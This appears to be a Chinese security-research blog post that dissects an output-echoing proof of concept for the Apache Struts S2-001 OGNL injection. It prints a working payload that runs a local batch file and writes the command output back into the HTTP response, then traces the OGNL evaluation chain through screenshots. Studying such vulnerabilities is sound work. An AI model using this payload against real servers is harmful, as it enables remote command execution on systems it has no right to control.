# POC

在struts的漏洞分析中,经常用到可回显POC,因为本人比较好奇其中的原理,便自己分析了一下,这里利用的时S2-001的环境,poc为

```java
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"d://cmd.bat"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
//cmd.bat文件中写的命令为"calc",这样是为了既能看到命令执行的效果又能拥有返回值
```

流程从这里开始分析,然后调用OgnlValueStack#findValue

![image-20210811120250490](可回显poc/image-20210811120250490.png)

继续往里面跟

![image-20210811120312947](可回显poc/image-20210811120312947.png)

快进到ASTSequence#getValueBody,这里对children,进行遍历,依次进行解析

![image-20210811120612313](可回显poc/image-20210811120612313.png)

![image-20210811120716713](可回显poc/image-20210811120716713.png)

此时的调用链为:

![image-20210811120745227](可回显poc/image-20210811120745227.png)

```
getValue->evaluateGetValueBody->getValueBody
```

然后再getValueBody中`Object result = this.children[1].getValue(context, source);`成功执行我们的命令,并将返回值赋值给了result

![image-20210811115816548](可回显poc/image-20210811115816548.png)

![image-20210811121450466](可回显poc/image-20210811121450466.png)





![image-20210811124356057](可回显poc/image-20210811124356057.png)

![image-20210811124527879](可回显poc/image-20210811124527879.png)



![image-20210811123028415](可回显poc/image-20210811123028415.png)

